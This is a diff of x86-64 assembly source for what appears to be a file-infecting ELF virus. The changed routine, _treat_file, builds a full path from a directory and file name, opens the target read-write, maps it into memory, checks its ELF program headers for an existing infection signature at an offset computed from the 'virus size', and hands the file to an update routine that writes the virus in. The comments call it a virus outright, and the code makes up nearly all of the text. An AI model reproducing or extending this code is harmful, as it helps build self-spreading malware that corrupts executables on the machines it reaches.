@@ -3,6 +3,7 @@ section .text
 	global _final_end
 	extern _update_mmaped_file
 	extern _string
+	extern _ft_strlen
 
 _file_size:
 	enter 24, 0
@@ -24,8 +25,8 @@ _file_size:
 	leave
 	ret
 
-_treat_file: ; void treat_file(char *name, long virus_size)
-	enter 80, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
+_treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx))
+	enter 120, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
 				; rsp + 0 bytes for fd
 				; rsp + 8 bytes for virus size
 				; rsp + 16 bytes for file size
@@ -34,17 +35,72 @@ _treat_file: ; void treat_file(char *name, long virus_size)
 				; rsp + 40 actual phnum
 				; rsp + 48 ehdr->e_phnum
 				; rsp + 56 supposed string of file
+				; rsp + 64 name addr
+				; rsp + 72 full_path addr
+				; rsp + 80 name len
+				; rsp + 88 full_path len
+				; rsp + 96 total len
 ; check if name != NULL
 	cmp rdi, 0
 	je _final_end
 ; save virus_size
 	mov QWORD [rsp + 8], rsi
+	mov QWORD [rsp + 64], rdi
+	mov QWORD [rsp + 72], rdx
+	mov rdi, QWORD [rsp + 64]
+_lab_strlen_1:
+	call _ft_strlen
+	mov QWORD [rsp + 80], rax
+	mov rdi, QWORD [rsp + 72]
+_lab_strlen_2:
+	call _ft_strlen
+	mov QWORD [rsp + 88], rax
+	mov r10, rsp
+	add r10, 96
+	mov r11, QWORD [rsp + 80]
+	mov QWORD [r10], r11
+	mov r11, QWORD [rsp + 88]
+	add QWORD [r10], r11
+	add QWORD [r10], 2
+; path
+	mov rdi, rsp
+	sub rdi, QWORD [rsp + 96]
+	mov rsi, QWORD [rsp + 72]
+	mov rcx, QWORD [rsp + 88]
+	cld
+	rep movsb
+; path + '/'
+	mov rdi, rsp
+	sub rdi, QWORD [rsp + 96]
+	add rdi, QWORD [rsp + 88]
+	mov BYTE [rdi], 0x2f
+; path + '/' + file_name
+	add rdi, 1
+	mov rsi, QWORD [rsp + 64]
+	mov rcx, QWORD [rsp + 80]
+	cld
+	rep movsb
+	mov rdi, rsp
+	sub rdi, QWORD [rsp + 96]
+	add rdi, QWORD [rsp + 88]
+	add rdi, 1
+	add rdi, QWORD [rsp + 80]
+	mov BYTE [rdi], 0
 ;;;;;;;;;;;;;;;;;
 ; open file
+	mov rdi, rsp
+	sub rdi, QWORD [rsp + 96]
+_lab_test:
 	mov rax, 2
 	mov rsi, 2
 	xor rdx, rdx
+	mov r10, QWORD [rsp + 96]
+	sub rsp, r10
+	sub rsp, 8
+	mov QWORD [rsp], r10
+	add QWORD [rsp], 8
 	syscall
+	add rsp, QWORD [rsp]
 	cmp rax, -1
 	jle _final_end
 	mov QWORD [rsp], rax ; store the fd
@@ -53,6 +109,7 @@ _treat_file: ; void treat_file(char *name, long virus_size)
 	mov QWORD [rsp + 16], rax ; store file size
 	cmp rax, 64
 	jl _close_file
+	
 ;;;;;;;;;;;;;;;;;
 ; mmap file
 	mov rax, 9
@@ -63,6 +120,7 @@ _treat_file: ; void treat_file(char *name, long virus_size)
 	mov r8, QWORD [rsp]
 	mov r9, 0
 	syscall
+_verif_mmap:
 	cmp rax, 0
 	jle _close_file
 	mov QWORD [rsp + 24], rax
@@ -136,6 +194,9 @@ _loop_verif:
 	add QWORD [rsp + 56], r10 ; add it to the p_offset find before
 	mov r10, QWORD [rsp + 8] ; take the virus size
 	sub QWORD [rsp + 56], r10 ; substract the virus size to our offset+size
+_cmp_offset:
+	cmp QWORD [rsp + 56], 0
+	jle _call_mmaped_update ; if our string addr is lower than the mmap addr, so we are out of the file, and this one cant hold our virus
 ; now we have the theoric offset of our string, we need to add this offset on the mmap address
 	mov r10, QWORD [rsp + 24] ; take mmap address
 	add QWORD [rsp + 56], r10 ; add it to our offset
@@ -167,7 +228,13 @@ _call_mmaped_update:
 	mov rsi, QWORD [rsp + 16] ; file size
 	mov rdx, QWORD [rsp + 8] ; virus size
 	mov r10, QWORD [rsp] ; fd
+	mov r11, QWORD [rsp + 96]
+	sub rsp, r11
+	sub rsp, 8
+	mov QWORD [rsp], r11
+	add QWORD [rsp], 8
 	call _update_mmaped_file
+	add rsp, QWORD [rsp]
 
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; munmap
